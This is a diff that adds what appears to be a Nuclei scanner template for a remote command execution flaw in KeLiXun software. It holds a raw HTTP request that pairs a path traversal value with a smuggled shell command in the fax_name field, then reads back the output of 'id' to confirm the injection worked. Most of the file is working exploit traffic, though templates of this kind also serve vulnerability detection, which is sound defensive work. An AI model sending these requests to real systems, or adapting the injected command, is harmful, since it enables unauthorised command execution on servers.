@@ -1,0 +1,60 @@
+id: KeLiXun-feedback-RCE
+
+info:
+  name: KeLiXun-feedback-RCE
+  author: iSee857
+  severity: critical
+  description: KeLiXun-feedback-RCE
+  reference:
+    - https://github.com/iSee857
+  tags: kelixun,Rce
+
+
+http:
+  - raw:
+      - |
+        POST /custom/zx/fax/send_fax.php HTTP/1.1
+        Host: {{Host}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc
+        User-Agent: Mozilla/5.0
+
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="sendfile";filename="helloWorld.php";
+        Content-Type: text/plain
+
+        helloWorld
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="fax_extention"
+
+        ../../../../../..
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="fax_caller_id_name"
+
+        file
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="fax_caller_id_number"
+
+        file
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc
+        Content-Disposition: form-data; name="fax_name"
+
+        ;echo   `id`|tee        hello.txt;.pdf
+        ------WebKitFormBoundaryJpMyThWnAxbcBBQc--
+
+      - |
+        GET /custom/zx/fax/hello.txt HTTP/1.1
+        Host: {{Host}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "uid"
+          - "gid"
+        part: body
+
+      - type: status
+        status:
+          - 200
